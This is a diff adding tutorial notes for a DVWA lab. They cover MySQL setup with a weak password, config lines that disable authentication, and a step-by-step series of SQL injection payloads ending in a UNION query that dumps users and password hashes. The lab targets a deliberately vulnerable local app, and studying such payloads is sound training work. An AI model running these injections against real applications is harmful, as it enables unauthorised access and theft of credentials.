@@ -1,0 +1,33 @@
+
+****Commands that used on Video******
+http://192.168.35.141/
+admin
+password
+
+DVWA security > low
+
+http://192.168.35.141/dvwa/setup.php
+
+Setup > create rest database
+sudo su
+mysql
+
+create database dvwa;
+create user dvwa@localhost identified by 'p@ssw0rd';
+grant all on dvwa.* to dvwa@localhost;
+flush privileges;
+$_DVWA[ 'disable_authentication' ] = true;
+$_DVWA[ 'default_security_level' ] = 'low';
+exit
+
+mysql -u dvwa -pp@ssw0rd -D dvwa
+
+SELECT first_name, last_name FROM users WHERE user_id = '1';
+%' or '0'='0'
+SELECT first_name, last_name FROM users WHERE user_id = '%' or '1'='1';
+%' or 0=0 union select null, version() #
+%' or 0=0 union select null, user() #
+%' and 1=0 union select null, table_name from information_schema.tables #
+%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+%' and 1=0 union select null, table_name from information_schema.tables #
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
